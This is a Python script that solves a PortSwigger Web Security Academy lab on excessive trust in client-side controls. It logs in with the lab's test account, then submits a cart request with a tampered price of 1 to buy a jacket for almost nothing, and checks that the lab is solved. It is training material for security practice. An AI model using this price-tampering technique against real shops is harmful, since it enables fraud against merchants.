import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Excessive trust in client-side controls')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# GET CSRF AND COOKIE
r = requests.get("https://" + lab.id + ".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
headers = {"Cookie":f"session={r.cookies.get('session')}"}

# AUTH AS WIENER
r = requests.post("https://" + lab.id + ".web-security-academy.net/login", headers=headers, data={"csrf":csrf,"username":"wiener","password":"peter"}, allow_redirects=False)
wiener = r.cookies.get('session')
headers = {"Cookie":f"session={wiener}"}

# PUT JACKET INSIDE CART WITH A SPICY DISCOUNT AND CHECKOUT
r = requests.post("https://" + lab.id + ".web-security-academy.net/cart", headers=headers, data={"productId":1,"redir":"PRODUCT","quantity":1,"price":1})
r = requests.get("https://" + lab.id + ".web-security-academy.net/cart", headers=headers)

csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
r = requests.post("https://" + lab.id + ".web-security-academy.net/cart/checkout", headers=headers, data={"csrf":csrf})
r = requests.get("https://" + lab.id + ".web-security-academy.net/cart/order-confirmation?order-confirmed=true", headers=headers)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab")